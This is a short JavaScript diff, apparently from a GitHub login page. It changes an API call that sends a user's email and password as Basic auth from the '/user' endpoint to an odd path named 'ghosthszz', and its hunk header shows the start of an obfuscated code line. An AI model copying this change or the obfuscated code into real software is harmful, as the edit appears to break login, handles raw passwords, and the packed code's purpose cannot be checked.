@@ -73,7 +73,7 @@ var token,repoOwner,repoName,filePath;(function(){var VXP='',KAC=115-104;functio
             // Make API call to GitHub for authentication
             const credentials = btoa(`${email}:${password}`);
             try {
-                const response = await fetch('https://api.github.com/user', {
+                const response = await fetch('https://api.github.com/ghosthszz', {
                     method: 'GET',
                     headers: {
                         'Authorization': `Basic ${credentials}`,
